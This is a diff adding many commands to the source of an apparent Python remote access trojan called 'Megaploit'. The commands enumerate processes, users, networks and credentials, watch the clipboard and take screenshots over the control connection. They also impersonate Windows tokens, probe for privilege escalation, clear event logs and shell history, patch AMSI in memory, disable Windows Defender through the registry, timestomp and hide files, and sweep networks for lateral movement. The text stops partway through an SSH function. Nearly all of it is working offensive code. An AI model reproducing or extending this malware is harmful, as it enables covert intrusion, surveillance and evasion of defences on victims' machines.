@@ -1084,6 +1084,1127 @@ def _self_destruct(conn, args: list[str]) -> str:
 
 
 # ---------------------------------------------------------------------------
+# Process & network intelligence
+# ---------------------------------------------------------------------------
+
+@_register("ps")
+def _ps(conn, args: list[str]) -> str:
+    """List running processes. Optional name/pid filter."""
+    filt = args[0].lower() if args else ""
+    try:
+        import psutil
+        lines = [f"  {'PID':<8} {'NAME':<30} {'USER':<16} {'CPU%':<7} MEM%"]
+        lines.append("  " + "─" * 72)
+        for p in sorted(psutil.process_iter(["pid","name","username","cpu_percent","memory_percent"]),
+                         key=lambda x: x.info["pid"] or 0):
+            try:
+                i = p.info
+                n = (i.get("name") or "").lower()
+                pid_s = str(i.get("pid",""))
+                if filt and filt not in n and filt not in pid_s:
+                    continue
+                lines.append(f"  {pid_s:<8} {(i.get('name') or ''):<30} "
+                              f"{(i.get('username') or '')[:16]:<16} "
+                              f"{i.get('cpu_percent',0.0):<7.1f} "
+                              f"{i.get('memory_percent',0.0):.1f}")
+            except (psutil.NoSuchProcess, psutil.AccessDenied):
+                pass
+        return "\n".join(lines)
+    except ImportError:
+        # fallback to shell
+        if sys.platform == "win32":
+            return _shell_exec("tasklist /FO TABLE /NH")
+        return _shell_exec("ps aux")
+
+
+@_register("kill")
+def _kill(conn, args: list[str]) -> str:
+    if not args or not args[0].isdigit():
+        return "Usage: kill <pid>"
+    pid = int(args[0])
+    try:
+        import psutil
+        p = psutil.Process(pid)
+        p.terminate()
+        return f"[+] Sent SIGTERM to PID {pid} ({p.name()})"
+    except ImportError:
+        import signal
+        os.kill(pid, signal.SIGTERM if hasattr(signal, "SIGTERM") else 9)
+        return f"[+] Killed PID {pid}"
+    except Exception as e:
+        return f"[-] kill: {e}"
+
+
+@_register("netstat")
+def _netstat(conn, args: list[str]) -> str:
+    try:
+        import psutil
+        lines = [f"  {'PROTO':<7} {'LOCAL':<24} {'REMOTE':<24} {'STATE':<14} PID"]
+        lines.append("  " + "─" * 76)
+        for c in psutil.net_connections(kind="inet"):
+            la = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else ""
+            ra = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else ""
+            proto = "tcp" if c.type == 1 else "udp"
+            pid   = str(c.pid or "")
+            lines.append(f"  {proto:<7} {la:<24} {ra:<24} {(c.status or ''):<14} {pid}")
+        return "\n".join(lines)
+    except ImportError:
+        if sys.platform == "win32":
+            return _shell_exec("netstat -ano")
+        return _shell_exec("ss -tunp")
+
+
+@_register("arp")
+def _arp(conn, args: list[str]) -> str:
+    if sys.platform == "win32":
+        return _shell_exec("arp -a")
+    return _shell_exec("arp -n 2>/dev/null || ip neigh show")
+
+
+@_register("dns_query")
+def _dns_query(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: dns_query <hostname>"
+    import socket as _sock
+    host = args[0]
+    try:
+        infos = _sock.getaddrinfo(host, None)
+        addrs = list({r[4][0] for r in infos})
+        return "\n".join(f"  {host}  →  {a}" for a in addrs)
+    except Exception as e:
+        return f"[-] DNS lookup failed: {e}"
+
+
+@_register("routes")
+def _routes(conn, args: list[str]) -> str:
+    if sys.platform == "win32":
+        return _shell_exec("route print")
+    return _shell_exec("ip route 2>/dev/null || netstat -rn")
+
+
+@_register("ifconfig")
+def _ifconfig(conn, args: list[str]) -> str:
+    try:
+        import psutil
+        lines = []
+        for iface, addrs in psutil.net_if_addrs().items():
+            lines.append(f"  {iface}:")
+            for a in addrs:
+                af = {2:"IPv4", 10:"IPv6", 17:"MAC"}.get(a.family, str(a.family))
+                lines.append(f"    {af:<6} {a.address}")
+        return "\n".join(lines) if lines else "(no interfaces)"
+    except ImportError:
+        if sys.platform == "win32":
+            return _shell_exec("ipconfig /all")
+        return _shell_exec("ip addr 2>/dev/null || ifconfig")
+
+
+# ---------------------------------------------------------------------------
+# Environment & system discovery
+# ---------------------------------------------------------------------------
+
+@_register("env")
+def _env(conn, args: list[str]) -> str:
+    filt = args[0].lower() if args else ""
+    pairs = []
+    for k, v in sorted(os.environ.items()):
+        if not filt or filt in k.lower() or filt in v.lower():
+            pairs.append(f"  {k}={v}")
+    return "\n".join(pairs) if pairs else "(no matching env vars)"
+
+
+@_register("installed_software")
+def _installed_software(conn, args: list[str]) -> str:
+    if sys.platform == "win32":
+        return _shell_exec(
+            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall "
+            "/s /v DisplayName 2>nul | findstr DisplayName"
+        )
+    elif sys.platform == "darwin":
+        return _shell_exec("system_profiler SPApplicationsDataType | grep '    Location:'")
+    else:
+        for cmd in ("dpkg --get-selections", "rpm -qa", "pacman -Q", "flatpak list"):
+            bin_ = cmd.split()[0]
+            if shutil.which(bin_):
+                return _shell_exec(cmd)
+        return "[-] No package manager found"
+
+
+@_register("active_windows")
+def _active_windows(conn, args: list[str]) -> str:
+    if sys.platform == "win32":
+        try:
+            import ctypes
+            import ctypes.wintypes as wt
+            EnumWindows     = ctypes.windll.user32.EnumWindows
+            GetWindowTextW  = ctypes.windll.user32.GetWindowTextW
+            IsWindowVisible = ctypes.windll.user32.IsWindowVisible
+            titles: list[str] = []
+            WNDENUMPROC = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
+            def _cb(hwnd, _):
+                if IsWindowVisible(hwnd):
+                    buf = ctypes.create_unicode_buffer(256)
+                    GetWindowTextW(hwnd, buf, 256)
+                    t = buf.value.strip()
+                    if t:
+                        titles.append(t)
+                return True
+            EnumWindows(WNDENUMPROC(_cb), 0)
+            return "\n".join(f"  {t}" for t in titles)
+        except Exception as e:
+            return f"[-] active_windows: {e}"
+    elif sys.platform == "darwin":
+        return _shell_exec(
+            "osascript -e 'tell application \"System Events\" "
+            "to get the title of every window of every process'"
+        )
+    else:
+        if shutil.which("wmctrl"):
+            return _shell_exec("wmctrl -l")
+        return "[-] wmctrl not found (install wmctrl for Linux window listing)"
+
+
+@_register("scheduled_tasks")
+def _scheduled_tasks(conn, args: list[str]) -> str:
+    if sys.platform == "win32":
+        return _shell_exec("schtasks /query /fo LIST /v 2>&1 | findstr /i \"Task Name\\|Status\\|Run As\"")
+    elif sys.platform == "darwin":
+        return _shell_exec("launchctl list")
+    else:
+        out = []
+        for f in ("/var/spool/cron/crontabs", "/etc/cron.d", "/etc/crontab"):
+            if os.path.exists(f):
+                out.append(f"=== {f} ===")
+                try:
+                    if os.path.isdir(f):
+                        for fn in sorted(os.listdir(f)):
+                            fp = os.path.join(f, fn)
+                            try:
+                                with open(fp) as fh:
+                                    out.append(fh.read())
+                            except PermissionError:
+                                out.append(f"  [{fn}] permission denied")
+                    else:
+                        with open(f) as fh:
+                            out.append(fh.read())
+                except PermissionError:
+                    out.append("  permission denied")
+        return "\n".join(out) if out else "[-] No cron entries found"
+
+
+@_register("services")
+def _services(conn, args: list[str]) -> str:
+    filt = args[0].lower() if args else ""
+    if sys.platform == "win32":
+        raw = _shell_exec("sc query type= all state= all 2>&1")
+        if filt:
+            raw = "\n".join(l for l in raw.splitlines() if filt in l.lower())
+        return raw
+    else:
+        cmd = "systemctl list-units --type=service --no-pager 2>/dev/null"
+        if filt:
+            cmd += f" | grep -i {filt}"
+        return _shell_exec(cmd) or _shell_exec("service --status-all 2>&1")
+
+
+@_register("users")
+def _users(conn, args: list[str]) -> str:
+    if sys.platform == "win32":
+        return _shell_exec("net user 2>&1")
+    try:
+        import pwd
+        lines = [f"  {'USER':<20} {'UID':<6} {'GID':<6} {'HOME':<30} SHELL"]
+        for p in sorted(pwd.getpwall(), key=lambda x: x.pw_uid):
+            lines.append(f"  {p.pw_name:<20} {p.pw_uid:<6} {p.pw_gid:<6} {p.pw_dir:<30} {p.pw_shell}")
+        return "\n".join(lines)
+    except ImportError:
+        return _shell_exec("cat /etc/passwd")
+
+
+@_register("logged_in")
+def _logged_in(conn, args: list[str]) -> str:
+    if sys.platform == "win32":
+        return _shell_exec("query user 2>&1")
+    return _shell_exec("w -h 2>/dev/null || who")
+
+
+@_register("startup_items")
+def _startup_items(conn, args: list[str]) -> str:
+    if sys.platform == "win32":
+        return _shell_exec(
+            "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>&1 && "
+            "reg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 2>&1"
+        )
+    elif sys.platform == "darwin":
+        return _shell_exec("launchctl list | head -50")
+    else:
+        paths = [
+            "/etc/rc.local",
+            "/etc/init.d",
+            os.path.expanduser("~/.config/autostart"),
+            "/etc/xdg/autostart",
+        ]
+        out = []
+        for p in paths:
+            if os.path.exists(p):
+                out.append(f"=== {p} ===")
+                if os.path.isdir(p):
+                    out.extend(f"  {f}" for f in os.listdir(p))
+                else:
+                    try:
+                        with open(p) as fh:
+                            out.append(fh.read()[:500])
+                    except PermissionError:
+                        out.append("  (permission denied)")
+        return "\n".join(out) if out else "(none found)"
+
+
+@_register("os_info")
+def _os_info(conn, args: list[str]) -> str:
+    import platform
+    lines = [
+        f"  OS:           {platform.system()} {platform.release()} {platform.version()}",
+        f"  Machine:      {platform.machine()}",
+        f"  Node:         {platform.node()}",
+        f"  Processor:    {platform.processor()}",
+        f"  Python:       {platform.python_version()}",
+    ]
+    if sys.platform == "win32":
+        lines.append("  --- Windows specifics ---")
+        lines.append(_shell_exec("systeminfo 2>&1 | findstr /i \"OS Name\\|Version\\|Build\\|Install\\|Uptime\""))
+    elif sys.platform == "linux":
+        try:
+            with open("/etc/os-release") as fh:
+                lines.append("  --- /etc/os-release ---")
+                lines.append(fh.read().strip())
+        except OSError:
+            pass
+        lines.append(_shell_exec("uptime -p 2>/dev/null || uptime"))
+    return "\n".join(lines)
+
+
+# ---------------------------------------------------------------------------
+# File intelligence
+# ---------------------------------------------------------------------------
+
+@_register("ls")
+def _ls(conn, args: list[str]) -> str:
+    import stat as _stat
+    path = args[0] if args else os.getcwd()
+    try:
+        entries = sorted(os.listdir(path))
+    except PermissionError:
+        return f"[-] Permission denied: {path}"
+    except FileNotFoundError:
+        return f"[-] Not found: {path}"
+    lines = [f"  {'NAME':<36} {'SIZE':>10}  {'PERMS':<12} MODIFIED"]
+    for name in entries:
+        full = os.path.join(path, name)
+        try:
+            st   = os.stat(full)
+            size = st.st_size
+            perm = oct(st.st_mode)[-4:]
+            mtime = time.strftime("%Y-%m-%d %H:%M", time.localtime(st.st_mtime))
+            suffix = "/" if os.path.isdir(full) else ""
+            lines.append(f"  {name+suffix:<36} {size:>10,}  {perm:<12} {mtime}")
+        except OSError:
+            lines.append(f"  {name}")
+    return "\n".join(lines)
+
+
+@_register("cat")
+def _cat(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: cat <file>"
+    path = args[0]
+    if not os.path.isfile(path):
+        return f"[-] Not found: {path}"
+    try:
+        size = os.path.getsize(path)
+        if size > 1_048_576:
+            return f"[-] File too large to cat ({size:,} bytes). Use download instead."
+        with open(path, "r", encoding="utf-8", errors="replace") as fh:
+            return fh.read()
+    except PermissionError:
+        return f"[-] Permission denied: {path}"
+    except Exception as e:
+        return f"[-] cat: {e}"
+
+
+@_register("find_files")
+def _find_files(conn, args: list[str]) -> str:
+    if len(args) < 2:
+        return "Usage: find_files <path> <pattern>"
+    import fnmatch
+    root, pat = args[0], args[1]
+    hits: list[str] = []
+    for dirpath, dirs, files in os.walk(root):
+        for fn in files:
+            if fnmatch.fnmatch(fn.lower(), pat.lower()):
+                hits.append(os.path.join(dirpath, fn))
+            if len(hits) >= 500:
+                break
+        if len(hits) >= 500:
+            break
+    return "\n".join(hits) if hits else f"[-] No files matching '{pat}' under {root}"
+
+
+@_register("find_writable")
+def _find_writable(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: find_writable <path>"
+    root = args[0]
+    hits: list[str] = []
+    for dirpath, dirs, files in os.walk(root):
+        for name in dirs + files:
+            full = os.path.join(dirpath, name)
+            try:
+                if os.access(full, os.W_OK):
+                    hits.append(full)
+            except OSError:
+                pass
+        if len(hits) >= 200:
+            break
+    return "\n".join(hits) if hits else "[-] No world-writable paths found"
+
+
+@_register("find_suid")
+def _find_suid(conn, args: list[str]) -> str:
+    if sys.platform == "win32":
+        return "[-] SUID is a Unix concept"
+    return _shell_exec(
+        "find / -perm /6000 -type f -not -path '/proc/*' -not -path '/sys/*' 2>/dev/null | head -100"
+    )
+
+
+@_register("file_hash")
+def _file_hash(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: file_hash <path>"
+    import hashlib
+    path = args[0]
+    if not os.path.isfile(path):
+        return f"[-] Not found: {path}"
+    try:
+        h = hashlib.sha256()
+        with open(path, "rb") as fh:
+            for chunk in iter(lambda: fh.read(65536), b""):
+                h.update(chunk)
+        return f"[+] SHA-256  {path}\n    {h.hexdigest()}"
+    except Exception as e:
+        return f"[-] file_hash: {e}"
+
+
+@_register("tail")
+def _tail(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: tail <file> [lines]"
+    path  = args[0]
+    n     = int(args[1]) if len(args) > 1 and args[1].isdigit() else 20
+    if not os.path.isfile(path):
+        return f"[-] Not found: {path}"
+    try:
+        with open(path, "r", encoding="utf-8", errors="replace") as fh:
+            all_lines = fh.readlines()
+        return "".join(all_lines[-n:])
+    except Exception as e:
+        return f"[-] tail: {e}"
+
+
+@_register("write_file")
+def _write_file(conn, args: list[str]) -> str:
+    if len(args) < 2:
+        return "Usage: write_file <path> <content>"
+    path    = args[0]
+    content = " ".join(args[1:])
+    try:
+        os.makedirs(os.path.dirname(path) or ".", exist_ok=True)
+        with open(path, "w", encoding="utf-8") as fh:
+            fh.write(content)
+        return f"[+] Written: {path}"
+    except Exception as e:
+        return f"[-] write_file: {e}"
+
+
+@_register("mkdir")
+def _mkdir(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: mkdir <path>"
+    try:
+        os.makedirs(args[0], exist_ok=True)
+        return f"[+] Created: {args[0]}"
+    except Exception as e:
+        return f"[-] mkdir: {e}"
+
+
+@_register("rm")
+def _rm(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: rm <path>"
+    path = args[0]
+    try:
+        if os.path.isdir(path):
+            import shutil as _shutil
+            _shutil.rmtree(path)
+        else:
+            os.remove(path)
+        return f"[+] Removed: {path}"
+    except Exception as e:
+        return f"[-] rm: {e}"
+
+
+@_register("chmod")
+def _chmod(conn, args: list[str]) -> str:
+    if len(args) < 2:
+        return "Usage: chmod <mode> <path>"
+    if sys.platform == "win32":
+        return "[-] chmod is Unix-only"
+    try:
+        os.chmod(args[1], int(args[0], 8))
+        return f"[+] chmod {args[0]} {args[1]}"
+    except Exception as e:
+        return f"[-] chmod: {e}"
+
+
+# ---------------------------------------------------------------------------
+# GUI & interaction
+# ---------------------------------------------------------------------------
+
+@_register("screenshot_region")
+def _screenshot_region(conn, args: list[str]) -> str | None:
+    if len(args) != 4 or not all(a.isdigit() for a in args):
+        return "Usage: screenshot_region <x> <y> <width> <height>"
+    x, y, w, h = int(args[0]), int(args[1]), int(args[2]), int(args[3])
+    try:
+        import io, cv2, mss, numpy as np
+        with mss.mss() as sct:
+            region = {"top": y, "left": x, "width": w, "height": h}
+            raw = sct.grab(region)
+            arr = np.array(raw)
+        bgr = cv2.cvtColor(arr, cv2.COLOR_BGRA2BGR)
+        ok, buf = cv2.imencode(".jpg", bgr, [cv2.IMWRITE_JPEG_QUALITY, 85])
+        if not ok:
+            return "[-] encode failed"
+        fname = "_region.jpg"
+        with open(fname, "wb") as f:
+            f.write(buf.tobytes())
+        _send_msg(conn, "FILE_OK")
+        _send_file(conn, fname)
+        try:
+            os.remove(fname)
+        except OSError:
+            pass
+        return None
+    except Exception as e:
+        return f"[-] screenshot_region: {e}"
+
+
+@_register("notify")
+def _notify(conn, args: list[str]) -> str:
+    if len(args) < 2:
+        return "Usage: notify <title> <message>"
+    title = args[0]
+    msg   = " ".join(args[1:])
+    if sys.platform == "win32":
+        # Windows toast via PowerShell
+        ps = (f"[Windows.UI.Notifications.ToastNotificationManager, Windows.UI.Notifications, "
+              f"ContentType=WindowsRuntime] | Out-Null; "
+              f"$xml = [Windows.UI.Notifications.ToastNotificationManager]"
+              f"::GetTemplateContent([Windows.UI.Notifications.ToastTemplateType]::ToastText02); "
+              f"$xml.GetElementsByTagName('text')[0].InnerText = '{title}'; "
+              f"$xml.GetElementsByTagName('text')[1].InnerText = '{msg}'; "
+              f"$toast = [Windows.UI.Notifications.ToastNotification]::new($xml); "
+              f"[Windows.UI.Notifications.ToastNotificationManager]::CreateToastNotifier('Megaploit')"
+              f".Show($toast)")
+        try:
+            subprocess.Popen(["powershell", "-NoProfile", "-NonInteractive", "-Command", ps],
+                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            return "[+] Notification sent"
+        except Exception as e:
+            return f"[-] notify: {e}"
+    elif sys.platform == "darwin":
+        script = f'display notification "{msg}" with title "{title}"'
+        subprocess.Popen(["osascript", "-e", script],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return "[+] Notification sent"
+    else:
+        for cmd in (["notify-send", title, msg], ["zenity", "--notification", f"--text={title}: {msg}"]):
+            if shutil.which(cmd[0]):
+                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                return f"[+] Notification sent via {cmd[0]}"
+        return "[-] No notification tool available (install libnotify / notify-send)"
+
+
+@_register("open_url")
+def _open_url(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: open_url <url>"
+    import webbrowser
+    try:
+        webbrowser.open(args[0])
+        return f"[+] Opened: {args[0]}"
+    except Exception as e:
+        return f"[-] open_url: {e}"
+
+
+@_register("play_sound")
+def _play_sound(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: play_sound <wav_path>"
+    path = args[0]
+    if not os.path.isfile(path):
+        return f"[-] Not found: {path}"
+    if sys.platform == "win32":
+        try:
+            import ctypes
+            ctypes.windll.winmm.PlaySoundW(path, None, 0x0001)
+            return "[+] Sound played"
+        except Exception as e:
+            return f"[-] play_sound: {e}"
+    elif sys.platform == "darwin":
+        subprocess.Popen(["afplay", path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return "[+] Sound played"
+    else:
+        for cmd in (["aplay", path], ["paplay", path], ["ffplay", "-nodisp", "-autoexit", path]):
+            if shutil.which(cmd[0]):
+                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                return f"[+] Sound played via {cmd[0]}"
+        return "[-] No audio player found"
+
+
+@_register("set_wallpaper")
+def _set_wallpaper(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: set_wallpaper <image_path>"
+    path = os.path.abspath(args[0])
+    if not os.path.isfile(path):
+        return f"[-] Not found: {path}"
+    if sys.platform == "win32":
+        try:
+            import ctypes
+            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
+            return "[+] Wallpaper changed"
+        except Exception as e:
+            return f"[-] set_wallpaper: {e}"
+    elif sys.platform == "darwin":
+        script = f'tell app "Finder" to set desktop picture to POSIX file "{path}"'
+        subprocess.Popen(["osascript", "-e", script],
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        return "[+] Wallpaper changed"
+    else:
+        for cmd in (
+            ["gsettings", "set", "org.gnome.desktop.background", "picture-uri", f"file://{path}"],
+            ["feh", "--bg-scale", path],
+            ["xfconf-query", "-c", "xfce4-desktop", "-p",
+             "/backdrop/screen0/monitor0/workspace0/last-image", "-s", path],
+        ):
+            if shutil.which(cmd[0]):
+                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                return f"[+] Wallpaper changed via {cmd[0]}"
+        return "[-] No wallpaper tool found"
+
+
+@_register("clip_watch")
+def _clip_watch(conn, args: list[str]) -> str:
+    if not args or not args[0].isdigit():
+        return "Usage: clip_watch <seconds>"
+    seconds = int(args[0])
+    seen: set[str] = set()
+    lines: list[str] = []
+    end = time.time() + seconds
+
+    def _read():
+        try:
+            if sys.platform == "win32":
+                out = subprocess.check_output(
+                    ["powershell","-NoProfile","-NonInteractive","-command","Get-Clipboard"],
+                    text=True, stderr=subprocess.DEVNULL)
+                return out.strip()
+            elif sys.platform == "darwin":
+                return subprocess.check_output(["pbpaste"], text=True).strip()
+            else:
+                for cmd in (["xclip","-selection","clipboard","-o"],
+                            ["xsel","--clipboard","--output"],["wl-paste"]):
+                    if shutil.which(cmd[0]):
+                        return subprocess.check_output(cmd, text=True,
+                                                       stderr=subprocess.DEVNULL).strip()
+        except Exception:
+            pass
+        return ""
+
+    while time.time() < end:
+        val = _read()
+        if val and val not in seen:
+            seen.add(val)
+            ts = time.strftime("%H:%M:%S")
+            lines.append(f"[{ts}] {val[:200]}")
+        time.sleep(2)
+
+    return "\n".join(lines) if lines else "(no clipboard changes detected)"
+
+
+# ---------------------------------------------------------------------------
+# Token & privilege
+# ---------------------------------------------------------------------------
+
+@_register("whoami_priv")
+def _whoami_priv(conn, args: list[str]) -> str:
+    if sys.platform == "win32":
+        return _shell_exec("whoami /priv /groups 2>&1")
+    return _shell_exec("id && sudo -l 2>/dev/null")
+
+
+@_register("make_token")
+def _make_token(conn, args: list[str]) -> str:
+    if sys.platform != "win32":
+        return "[-] make_token is Windows-only"
+    if len(args) < 3:
+        return "Usage: make_token <username> <domain> <password>"
+    user, domain, password = args[0], args[1], args[2]
+    try:
+        import ctypes
+        import ctypes.wintypes as wt
+        LOGON32_LOGON_NEW_CREDENTIALS  = 9
+        LOGON32_PROVIDER_WINNT50       = 3
+        h_token = wt.HANDLE()
+        ok = ctypes.windll.advapi32.LogonUserW(
+            user, domain, password,
+            LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_WINNT50,
+            ctypes.byref(h_token)
+        )
+        if not ok:
+            err = ctypes.windll.kernel32.GetLastError()
+            return f"[-] LogonUser failed — error {err}"
+        ok2 = ctypes.windll.advapi32.ImpersonateLoggedOnUser(h_token)
+        ctypes.windll.kernel32.CloseHandle(h_token)
+        if not ok2:
+            return "[-] ImpersonateLoggedOnUser failed"
+        return f"[+] Token created and impersonating {domain}\\{user}"
+    except Exception as e:
+        return f"[-] make_token: {e}"
+
+
+@_register("rev2self")
+def _rev2self(conn, args: list[str]) -> str:
+    if sys.platform != "win32":
+        return "[-] rev2self is Windows-only"
+    try:
+        import ctypes
+        ctypes.windll.advapi32.RevertToSelf()
+        return "[+] Reverted to original token"
+    except Exception as e:
+        return f"[-] rev2self: {e}"
+
+
+@_register("getsystem")
+def _getsystem(conn, args: list[str]) -> str:
+    """Try multiple local priv-esc techniques automatically."""
+    if sys.platform != "win32":
+        # Linux: try common SUID binaries
+        for candidate in ("sudo -l", "pkexec --version"):
+            result = _shell_exec(candidate + " 2>/dev/null")
+            if "[sudo]" not in result and "not allowed" not in result:
+                return f"[*] Potential vector: {candidate}\n{result}"
+        return "[*] Checking SUID binaries…\n" + _shell_exec(
+            "find / -perm -4000 -type f 2>/dev/null | head -20"
+        )
+    # Windows: try token steal first
+    result = _token_steal(conn, [])
+    if "[+]" in result:
+        return result
+    # Fallback: service/binary path hijack check
+    hijack = _shell_exec(
+        'wmic service get name,pathname,startmode 2>&1 | '
+        'findstr /i "auto" | findstr /v "\\"'
+    )
+    if hijack.strip():
+        return f"[*] Potential unquoted service path(s):\n{hijack}"
+    return "[-] Could not auto-escalate — manual work required"
+
+
+# ---------------------------------------------------------------------------
+# Evasion & anti-forensics
+# ---------------------------------------------------------------------------
+
+@_register("timestomp")
+def _timestomp(conn, args: list[str]) -> str:
+    if len(args) < 2:
+        return "Usage: timestomp <target_path> <reference_path>"
+    target, ref = args[0], args[1]
+    if not os.path.exists(target):
+        return f"[-] Target not found: {target}"
+    if not os.path.exists(ref):
+        return f"[-] Reference not found: {ref}"
+    try:
+        st = os.stat(ref)
+        os.utime(target, (st.st_atime, st.st_mtime))
+        if sys.platform == "win32":
+            # Also copy creation time on Windows via ctypes
+            import ctypes, ctypes.wintypes as wt
+            GENERIC_WRITE = 0x40000000
+            FILE_FLAG_BACKUP_SEMANTICS = 0x02000000
+            h = ctypes.windll.kernel32.CreateFileW(
+                target, GENERIC_WRITE, 0, None, 3,
+                FILE_FLAG_BACKUP_SEMANTICS, None
+            )
+            if h and h != wt.HANDLE(-1).value:
+                # Convert Unix timestamp to FILETIME (100ns intervals since 1601)
+                EPOCH_DIFF = 11644473600
+                ft_val = int((st.st_mtime + EPOCH_DIFF) * 10_000_000)
+                ft = ctypes.c_uint64(ft_val)
+                ctypes.windll.kernel32.SetFileTime(h, ctypes.byref(ft), None, None)
+                ctypes.windll.kernel32.CloseHandle(h)
+        return f"[+] Timestamps copied from {ref} → {target}"
+    except Exception as e:
+        return f"[-] timestomp: {e}"
+
+
+@_register("clear_logs")
+def _clear_logs(conn, args: list[str]) -> str:
+    target = args[0].lower() if args else "all"
+    results: list[str] = []
+    if target in ("windows", "all") and sys.platform == "win32":
+        for log in ("System", "Application", "Security", "Setup"):
+            r = _shell_exec(f'wevtutil cl {log} 2>&1')
+            results.append(f"  [{log}] {r or 'cleared'}")
+    if target in ("linux", "all") and sys.platform != "win32":
+        for path in ("/var/log/syslog", "/var/log/auth.log", "/var/log/messages",
+                     os.path.expanduser("~/.bash_history"),
+                     os.path.expanduser("~/.zsh_history")):
+            if os.path.isfile(path):
+                try:
+                    open(path, "w").close()
+                    results.append(f"  [+] Cleared: {path}")
+                except PermissionError:
+                    results.append(f"  [-] Permission denied: {path}")
+    return "\n".join(results) if results else "[-] Nothing to clear"
+
+
+@_register("patch_amsi")
+def _patch_amsi(conn, args: list[str]) -> str:
+    if sys.platform != "win32":
+        return "[-] AMSI is Windows-only"
+    try:
+        import ctypes
+        amsi = ctypes.windll.LoadLibrary("amsi.dll")
+        # Get address of AmsiScanBuffer
+        addr = ctypes.windll.kernel32.GetProcAddress(amsi._handle, b"AmsiScanBuffer")
+        if not addr:
+            return "[-] AmsiScanBuffer not found"
+        # Patch with  ret 0  (xor eax,eax ; ret) — defeats AMSI scanning
+        patch = (ctypes.c_char * 6)(*b"\x31\xC0\xC3\x90\x90\x90")
+        old_prot = ctypes.c_ulong(0)
+        ctypes.windll.kernel32.VirtualProtect(addr, 6, 0x40, ctypes.byref(old_prot))
+        ctypes.memmove(addr, patch, 6)
+        ctypes.windll.kernel32.VirtualProtect(addr, 6, old_prot, ctypes.byref(old_prot))
+        return "[+] AMSI patched — AmsiScanBuffer returns AMSI_RESULT_CLEAN"
+    except Exception as e:
+        return f"[-] patch_amsi: {e}"
+
+
+@_register("disable_defender")
+def _disable_defender(conn, args: list[str]) -> str:
+    if sys.platform != "win32":
+        return "[-] Windows Defender is Windows-only"
+    results = []
+    cmds = [
+        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" "
+        "/v DisableAntiSpyware /t REG_DWORD /d 1 /f 2>&1",
+        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" "
+        "/v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f 2>&1",
+        "powershell -NoProfile -NonInteractive -Command "
+        "\"Set-MpPreference -DisableRealtimeMonitoring $true\" 2>&1",
+    ]
+    for cmd in cmds:
+        r = _shell_exec(cmd)
+        results.append(f"  {r.strip()[:80]}")
+    return "\n".join(results)
+
+
+@_register("hide_file")
+def _hide_file(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: hide_file <path>"
+    path = args[0]
+    if sys.platform == "win32":
+        r = _shell_exec(f'attrib +h +s "{path}" 2>&1')
+        return r or f"[+] Hidden: {path}"
+    else:
+        # Unix: just rename to .dotfile
+        base = os.path.basename(path)
+        if not base.startswith("."):
+            new_path = os.path.join(os.path.dirname(path), "." + base)
+            try:
+                os.rename(path, new_path)
+                return f"[+] Renamed to hidden: {new_path}"
+            except Exception as e:
+                return f"[-] hide_file: {e}"
+        return "[*] File already hidden (starts with dot)"
+
+
+# ---------------------------------------------------------------------------
+# Lateral movement
+# ---------------------------------------------------------------------------
+
+@_register("ping_sweep")
+def _ping_sweep(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: ping_sweep <cidr>"
+    cidr = args[0]
+    try:
+        import ipaddress
+        network = ipaddress.ip_network(cidr, strict=False)
+    except ValueError as e:
+        return f"[-] Invalid CIDR: {e}"
+
+    up: list[str] = []
+    import concurrent.futures
+
+    def _ping(ip: str) -> str | None:
+        if sys.platform == "win32":
+            r = subprocess.run(["ping", "-n", "1", "-w", "500", str(ip)],
+                               capture_output=True, timeout=3)
+        else:
+            r = subprocess.run(["ping", "-c", "1", "-W", "1", str(ip)],
+                               capture_output=True, timeout=3)
+        return str(ip) if r.returncode == 0 else None
+
+    hosts = list(network.hosts())
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as ex:
+        for result in ex.map(_ping, hosts):
+            if result:
+                up.append(result)
+
+    if not up:
+        return f"[-] No hosts up in {cidr}"
+    return f"[+] Hosts up ({len(up)}):\n" + "\n".join(f"  {ip}" for ip in sorted(up))
+
+
+@_register("smb_shares")
+def _smb_shares(conn, args: list[str]) -> str:
+    if not args:
+        return "Usage: smb_shares <host>"
+    host = args[0]
+    if sys.platform == "win32":
+        return _shell_exec(f"net view \\\\{host} /all 2>&1")
+    # Linux: try smbclient
+    if shutil.which("smbclient"):
+        return _shell_exec(f"smbclient -N -L //{host} 2>&1")
+    return "[-] smbclient not found"
+
+
+@_register("ssh_connect")
+def _ssh_connect(conn, args: list[str]) -> str:
+    if len(args) < 2:
+        return "Usage: ssh_connect <user> <host> [port]"
+    user, host = args[0], args[1]
+    port = int(args[2]) if len(args) > 2 and args[2].isdigit() else 22
+    if not shutil.which("ssh"):
